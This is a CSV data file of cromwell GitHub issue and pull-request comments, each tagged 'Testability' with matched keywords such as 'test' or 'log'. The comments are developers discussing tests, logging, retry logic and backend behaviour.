Testability,"@cjllanwarne not sure what you mean? This isn't really a fix so much as a simplification, and there are already tests in `WdlValueBuilderSpec` which thankfully continue to pass. 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1310#issuecomment-241476680:112,test,tests,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1310#issuecomment-241476680,2,['test'],['tests']
Testability,@cjllanwarne provided you're fully satisfied that it's safe and is well tested I'm good,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3938#issuecomment-409374762:72,test,tested,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3938#issuecomment-409374762,1,['test'],['tested']
Testability,"@cjllanwarne regarding testing the ""write to cache"" and ""read from cache""... that feature isn't available to this code, it's on another PR",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164577332:23,test,testing,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164577332,1,['test'],['testing']
Testability,"@cjllanwarne so the secondary issue of the file paths listed in the file generated by write_lines being the original paths rather than the localized ones has been fixed as well? I rewrote my tool to not use optional inputs, but it still failed even in v24 because it couldn't find those files:. ```; $ java -jar ~/bin/cromwell-24.jar run /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/aggregate_mafs.wdl tests/inputs.json; [2017-01-20 09:31:10,44] [info] Slf4jLogger started; [2017-01-20 09:31:10,52] [info] RUN sub-command; [2017-01-20 09:31:10,52] [info] WDL file: /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/aggregate_mafs.wdl; [2017-01-20 09:31:10,52] [info] Inputs: /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/tests/inputs.json; [2017-01-20 09:31:10,58] [info] SingleWorkflowRunnerActor: Submitting workflow; [2017-01-20 09:31:10,63] [info] Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 submitted.; [2017-01-20 09:31:10,63] [info] SingleWorkflowRunnerActor: Workflow submitted 814c47aa-9d11-4c81-a08c-f2b77c002b46; [2017-01-20 09:31:11,29] [info] Running with database db.url = jdbc:hsqldb:mem:396f6af4-b493-451b-ad19-2042625bf63e;shutdown=false;hsqldb.tx=mvcc; [2017-01-20 09:31:15,99] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2017-01-20 09:31:16,00] [info] [RenameWorkflowOptionsInMetadata] 100%; [2017-01-20 09:31:16,03] [info] Metadata summary refreshing every 2 seconds.; [2017-01-20 09:31:16,06] [info] 1 new workflows fetched; [2017-01-20 09:31:16,06] [info] WorkflowManagerActor Starting workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46; [2017-01-20 09:31:16,06] [info] WorkflowManagerActor Successfully started WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46; [2017-01-20 09:31:16,06] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2017-01-20 09:31:16,30] [info] MaterializeWorkflowDescriptorActor [814c47aa]: Cal",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:428,test,tests,428,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,2,['test'],['tests']
Testability,@cjllanwarne thanks for the feedback. I added the requested code. In the testing I took care to avoid code duplication. Is the code up to cromwell standards?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-421985663:73,test,testing,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-421985663,2,['test'],['testing']
Testability,"@cjllanwarne that's a great point. This should be super test-able as well to see if its easy to recreate. I also wonder if we can see a ""spike"" of aborting workflow states after a restart in grafana -- not sure if that's actually feasible?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4767#issuecomment-482741999:56,test,test-able,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4767#issuecomment-482741999,1,['test'],['test-able']
Testability,@cjllanwarne the goal here is to move all backend-specific logic off the `BackendCall` and into the `Backend`. This is an evolutionary step that maintains the same `BackendCall` interface but delegates all meaningful work directly or indirectly to the backend. When this process is complete the `BackendCall` will become useless and methods can become parameterized by `JobDescriptor` instead. The combination of `JobDescriptor` and `Backend` should be able to accomplish any call-level work in the system.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/509#issuecomment-193368423:59,log,logic,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/509#issuecomment-193368423,1,['log'],['logic']
Testability,"@cjllanwarne the reason was that `WdlNamespace.load` was throwing an `ValidationException` which unfortunately is a `Throwable` but not an `Exception`, which is why there's also a PR in lenthall to make `AggregatedException` an `Exception`... I can't find a `missing_import` test in centaur though",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289803572:275,test,test,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289803572,1,['test'],['test']
Testability,@cjllanwarne there _are_ some CC centaur tests FWIW,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1268#issuecomment-238709074:41,test,tests,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1268#issuecomment-238709074,1,['test'],['tests']
Testability,"@cjllanwarne there was one `ignore`d test about default runtime attributes that pretty clearly seemed to be covered by newer tests, so I've deleted that as well. There's one other abort test we should definitely continue to feel bad about, and another test for a ""taskless workflow"" for which I couldn't readily find an equivalent.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2566#issuecomment-324120498:37,test,test,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2566#issuecomment-324120498,8,['test'],"['test', 'tests']"
Testability,"@cjllanwarne updated the container image. I'm not inclined to add a glob test as I don't think it's really adding any value. As I said previously, if you'd like to add it knock yourself out",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4840#issuecomment-484174726:73,test,test,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4840#issuecomment-484174726,1,['test'],['test']
Testability,"@cjllanwarne, here is the PR. This is only for workflow definitions, and only for line numbers. I found that it is, as you were saying, hard to extract reliable information from Hermes for column numbers. I *would* like to get the entire extent in the source file covered by an AST. It was slow slog to updates the tests to correctly check line numbers. Let's start with this change, and see how it goes. . Thank you,; Ohad.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4938#issuecomment-489182117:315,test,tests,315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4938#issuecomment-489182117,1,['test'],['tests']
Testability,"@cjllanwarne, the test `cromwell.services.womtool.DescriberSpec` in sbt project `services` tests the values returned by describe.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5053#issuecomment-510137858:18,test,test,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5053#issuecomment-510137858,2,['test'],"['test', 'tests']"
Testability,"@cjllanwarne. * Created BA-5940 for the startsWith/contains discrepancy.; * I have similar concerns with large metadata and was thinking the same thing of decreasing window size and increasing frequency, but mostly I'd like to test in perf before merging to develop.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-523980184:227,test,test,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-523980184,1,['test'],['test']
Testability,"@cpavanrun Your right here, but this can be improved. What can be done here is lower the number of parallel jobs submitted by cromwell. This depends really on the cluster. In our case I did a stress test with 10000 parallel jobs and it still acts fine. Only downside is that the log is getting spammed a bit but it still works like it should. Still in the past (on older hardware) the headnode could not deal with this number of jobs. If this is the case limiting the parallel jobs could be a fix.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425029773:199,test,test,199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425029773,2,"['log', 'test']","['log', 'test']"
Testability,@danbills Could you give more information about the test cases you see for this issue? I thought about using [gatling-akka](https://github.com/chatwork/gatling-akka) in order to send a lot of messages to `WriteMetadataActor` and `MetadataSummaryRefreshActor`.; Do you thing this approach is suitable for this problem?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4762#issuecomment-522923560:52,test,test,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4762#issuecomment-522923560,1,['test'],['test']
Testability,"@danbills I think I'm actually changing my mind and leaning towards doing the try/retry instead:; 1) It seems generally more robust to be able to fallback to that (compared to caching where if we can't get the info or we get it wrong we'd fail workflows); 2) Talking to @kshakir, things seem to be moving towards more generic implementations of filesystems. The retry logic could be lifted up to the generic implementation whenever it happens (which might be harder to do with a caching logic); 3) We can always add caching later if we see Cromwell struggling too much; 4) Unlike what I was thinking first, it actually simplifies the code a little and even more testing (testing that things get cached properly and for the right amount of time is a pain). Thoughts ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3799#issuecomment-401420929:368,log,logic,368,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3799#issuecomment-401420929,8,"['log', 'test']","['logic', 'testing']"
Testability,@danbills I'd be happy to help debug any funnel issues you run into. Were you testing the v0.2 release or the latest on our master branch?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2396#issuecomment-332604270:78,test,testing,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2396#issuecomment-332604270,1,['test'],['testing']
Testability,@danbills Sure. the point is that there's a built in way to handle it and we should be doing that instead of our ad hoc method of having some catch all on every `receive` method throughout the system that are at best logging a message and potentially slightly changing the stacktrace. . We should remove those catch alls and use the built in capabilities.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-467168303:217,log,logging,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-467168303,1,['log'],['logging']
Testability,@danbills are the call logs still not localizing on TES?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2285#issuecomment-332234941:23,log,logs,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2285#issuecomment-332234941,1,['log'],['logs']
Testability,@danbills because I want to fix the JES tests too and I know they're still broken for now,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2680#issuecomment-334792061:40,test,tests,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2680#issuecomment-334792061,1,['test'],['tests']
Testability,"@danbills it makes me nervous that we're changing how something works in a way that enables one test, and then deleting an old test which was no longer working. Not saying this is bad or wrong (and the fewer of those old ""run a workflow"" tests the better)... this is just a request to check through the centaur tests and make sure they really do cover the case which you're assuming they do",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3474#issuecomment-378742018:96,test,test,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3474#issuecomment-378742018,4,['test'],"['test', 'tests']"
Testability,@danbills there's another centaur test `workflow_type_and_version_cwl` - is that related to- or maybe an older version of - this one?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2843#issuecomment-344407187:34,test,test,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2843#issuecomment-344407187,1,['test'],['test']
Testability,"@delocalizer @kcibul we talked about this internally. As background we went down this path as our integration tests were frequently failing in travis - hte output files would be empty or incomplete. . It was noted that our tests use a lot of `echo` and `cat` and are quite short, so the theory is we're running into [this](https://www.turnkeylinux.org/blog/unix-buffering). **if** that turns out to be the culprit (and it does make a lot of sense) one could either take the stance that tools need to be well formed and have properly flushed, or we could try to bake something into our controller bash script (which IMO adding so much stuff to that bash script is a bomb waiting to happen, but ....), some [ideas](http://serverfault.com/questions/294218/is-there-a-way-to-redirect-output-to-a-file-without-buffering-on-unix-linux) are in that link. @kcibul what's your reaction to the above? does it ring true or still seem fishy?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284812175:110,test,tests,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284812175,2,['test'],['tests']
Testability,"@delocalizer We're starting to consider that the issue is in tooling, specifically in the tools we use for our integration tests. Since you are as far as I know the largest user of the shared file system backend(s), to what degree do you trust that tools are flushing when they're complete?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-285268482:123,test,tests,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-285268482,1,['test'],['tests']
Testability,"@dgtester Since @geoffjentry just brought me up to speed on the exciting changes coming down the line with #401 (as well as #413), it would probably make more sense to revisit some of these tests afterwards, if they are still pertinent at that time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177692501:190,test,tests,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177692501,1,['test'],['tests']
Testability,"@dgtester just a heads up that I did some refactoring in the area of your recent PR that might at first look like I deleted your work, but actually that logic has been consolidated to `WorkflowManagerActor`. I've tested that SIGINT still works in both ""run"" and ""server"" use cases, but please let me know if you have any questions or concerns.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/413#issuecomment-178247776:153,log,logic,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/413#issuecomment-178247776,2,"['log', 'test']","['logic', 'tested']"
Testability,"@dheiman After some testing this seems fixed on 25, including running on docker. I would recommend upgrading to 25 and if the issue still persists feel free to re-open this issue !",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1906#issuecomment-289590686:20,test,testing,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1906#issuecomment-289590686,1,['test'],['testing']
Testability,"@dinvlad I just ran the monitoring script test using this ""doctered"" version of your function:; ```; def monitoringTerminationAction(): Action = {; val result = cloudSdkAction; .withCommand(s""/bin/sh"", ""-c"", s""kill -TERM -1 && sleep $monitoringTerminationGraceTime""); .withFlags(List(ActionFlag.AlwaysRun)); .setPidNamespace(monitoringPidNamespace). println(""result""). throw new Exception(result.toPrettyString); }; ```. ... and to my surprise... nothing got printed out and everything seemed to work fine. . Are you sure this function is actually being called from anywhere? If so, what are you doing that the test case is not? And can we engineer a test somehow to test this line of code?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5287#issuecomment-555688082:42,test,test,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5287#issuecomment-555688082,4,['test'],['test']
Testability,@dinvlad In my PR (#5023) the intention was to allow users to be able to interact with BQ from inside their WDL commands. With that in mind I believe what you're suggesting is that nothing untoward would happen unless they did this and their service account didn't have the corresponding permission set. Is that correct?. I still think it's worth testing to be sure but since it looks like we've added scopes before w/o issue I'm less fearful .... but IMO there's still a risk and we should make sure the risk is 0. Denis - it's on my list to poke at this but if you all don't want to wait for me and would like to validate success/failure please feel free to do so,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502247296:347,test,testing,347,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502247296,1,['test'],['testing']
Testability,@dinvlad if you want to test in a dev environment it should be possible to do that immediately (ie before merging the branch),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5382#issuecomment-577750772:24,test,test,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5382#issuecomment-577750772,1,['test'],['test']
Testability,"@dinvlad it was indeed a blind hunt! So in that sense, 204 permissions is not that much ... it's a pretty refined subset ;-) Previously I was running Cromwell with the `editor` role set, which likely has even more than 204 permissions. Without the `firebase.developAdmin` role, the only error I get is that the tasks start running, then they fail immediately, and the only thing you find in the logs is: `yyyy/mm/dd hh:mm:ss Starting container setup.`. In any case, I wanted to give an answer here to provide publicly available information to other users.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-680292333:395,log,logs,395,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-680292333,1,['log'],['logs']
Testability,"@djhshih I don't think it fully explains it, but the path to the localization strategies in the config file has changed.; `-Dbackend.shared-filesystem.localization.0=soft-link` won't have any effect.; Each backend now has its own `config` stanza. For local backend that would be ; `-Dbackend.providers.Local.config.filesystems.local.localization.0=soft-link`; Could you try with that and see if you have the same problem ?; I'm still confused as why some of them are soft-linked and some of them aren't. I think logging when a localization strategy fails would also be a good idea.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1072#issuecomment-230903835:512,log,logging,512,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1072#issuecomment-230903835,1,['log'],['logging']
Testability,@dmohs I can't find it at the moment but this is effectively a dupe of another ticket. It's been a known problem for years now that the logs Cromwell emits (console or otherwise) are trying to cover multiple user personas at once (and IMO not doing a great job for any of them) and that a more holistic solution needs to be put into place. . When I find the ticket I redirect all of this stuff towards I'll update,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4062#issuecomment-417414448:136,log,logs,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4062#issuecomment-417414448,1,['log'],['logs']
Testability,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:200,log,logs,200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972,2,['log'],"['logic', 'logs']"
Testability,@dshiga We expect this to be fixed in PAPI v2 backend. Have you had a chance to test this in v2 yet? Thanks!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-410760636:80,test,test,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-410760636,1,['test'],['test']
Testability,@dshiga is this how you ran the 50 before in testing? Are they 50 simultaneous submissions?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228409579:45,test,testing,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228409579,1,['test'],['testing']
Testability,"@dtenenba - the space on the scratch mount point (for cromwell it is `/cormwell_root`) is managed by a monitoring tool `ebs-autoscale` that is installed when creating a custom AMI configured for Cromwell, and then referencing that AMI when creating Batch compute environments. Running out of space points to one or more of the following:. * the monitor is not installed; * the monitor is looking at the wrong location in the filesystem. If you've created a custom AMI, I suggest launching an instance with it and checking that the monitor is watching the correct location. Do this by checking the log: `/var/log/ebs-autoscale.log`. If it's not, you'll need to recreate both the AMI and the Batch Compute Environment, and associate the new CE with your Job Queue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-468794942:597,log,log,597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-468794942,3,['log'],['log']
Testability,"@dvoet I wondered if you all were overriding that elsewhere. Have you run into issues w/ the loss of number of inserted elements or do you all just not care about that ever?. The function in question (don't have it in front of me) was using `++=` but that's why I was wondering if perhaps there's something else about our slick code which counteracts this. My slick-fu is likely not strong enough, I'll probably need to rely on bigger guns next week. My guess is that this is the culprit. I was looking at the general query log (I've only been using mysql, not cloudsql) and all I saw were individual inserts, never a batch insert. I can't get jprofiler to work reliably running against a JVM on GCS vms (at least not from home) so wasn't even looking at that :). Another thought is that something upstream is actually calling our slick code per-item instead of per-collection but I don't think that's the case. It's at least something I can double check easily.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-269846991:524,log,log,524,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-269846991,1,['log'],['log']
Testability,@dvoet do you have any better logging these days? Can you tell me more about what you are looking for when you need the Google logs?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-324470513:30,log,logging,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-324470513,2,['log'],"['logging', 'logs']"
Testability,@dvoet wouldn't adding the changeset at the beginning of the log cause checksum/validation error for Cromwells that are already deployed?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880:61,log,log,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880,1,['log'],['log']
Testability,"@ernoc So this sounds like there's a disconnect between the status changing in memory and getting updated in the db (as the REST endpoints report status from the db). . 1. Do you see anything in your logs that indicate db errors?; 2. What does your db config look like? ; 3. When you report the REST endpoint shows the workflow as 'Running', what about the `executionStatus` key in the metadata? Are some jobs marked as 'Running' as well?; 4. Do you see this behavior only with large scatters (10K) or do you see it with smaller scatters as well? Or any other type of workflow shape?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-445245400:200,log,logs,200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-445245400,1,['log'],['logs']
Testability,"@ffinfo Hi Peter - apologies for taking so long, the release I mentioned ended up taking a while longer than we thought. I talked to our PO this morning about this pull request and his take was that if this could be hooked up in a way which keeps the tests green (as much as they ever are) and doesn't add noticeable latency in the system for other users (and/or the behavior change is put behind a config option) that he'd be good with this concept. . It's been a month now so it's entirely possible you've already moved on with life or perhaps you have no interest for other reasons so I'll leave it up to you on how to proceed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-249220442:251,test,tests,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-249220442,1,['test'],['tests']
Testability,@ffinfo sorry for the slog that this PR has turned into. To give you some hope: once you've satisfied @mcovarr and he gives you a 👍 (and once you've rebased to let the tests pass) we should be good to merge. Thanks again for the PR!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-426667565:168,test,tests,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-426667565,1,['test'],['tests']
Testability,"@francares @cjllanwarne I think the actual issue here is that the ""/tmp"" assertions on lines 260 and 261 always fail on Mac, regardless of whether Docker is available or not.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1113#issuecomment-230058582:73,assert,assertions,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1113#issuecomment-230058582,1,['assert'],['assertions']
Testability,@francares @mcovarr I've modified this (fairly bluntly however) so that it passes on mac. If you have a suggestion for a stronger test case let me know,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1113#issuecomment-230491411:130,test,test,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1113#issuecomment-230491411,1,['test'],['test']
Testability,@francares sorry about the delay. There are separate tickets filed to converge documentation for config based backends so I wouldn't worry about that too much. :+1: assuming the tests pass. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2141/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2141#issuecomment-294217336:178,test,tests,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2141#issuecomment-294217336,1,['test'],['tests']
Testability,@freeseek are you reporting a bug in Cromwell's 504 detection and retry logic?. Receiving a 504 error in the first place is a Google problem and we have no control.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760305422:72,log,logic,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760305422,1,['log'],['logic']
Testability,"@freeseek if I send you a patched JAR do you think you'd be able to verify the fix?. Which is to say, do you get 504s frequently enough that you can test updated handling?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760326826:149,test,test,149,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760326826,1,['test'],['test']
Testability,@gauravs90 @francares Please note I've rebased and therefore had to update the ValidateActor to no longer require a backend on construction. I've also modified ValidateActorSpec to feed in the mock backend to the static CromwellBackend pool during testing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/586#issuecomment-199336078:193,mock,mock,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/586#issuecomment-199336078,2,"['mock', 'test']","['mock', 'testing']"
Testability,@gauravs90 this is really exciting. I suggest you rebase on top of @scottfrazer's #766 (or develop when he merges it) which means we'll have all the pieces to start testing end-to-end workflows!!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/743#issuecomment-216255705:165,test,testing,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/743#issuecomment-216255705,1,['test'],['testing']
Testability,@gdlex4015 or @andy7i - could you confirm that it's cool for us to do our own perf testing (and that this process is the right one)?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4996#issuecomment-495644563:83,test,testing,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4996#issuecomment-495644563,1,['test'],['testing']
Testability,"@gemmalam I think it is, except that it's hitting into a known bad test which was addressed after the branch was split off from develop. That test is now fixed but unfortunately we also need to address a bad PAPIv1 test. That also has a PR now so once either one of #4948 or #4949 merge and this PR gets rebased, I think we'll be good to merge it in.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4859#issuecomment-490574256:67,test,test,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4859#issuecomment-490574256,3,['test'],['test']
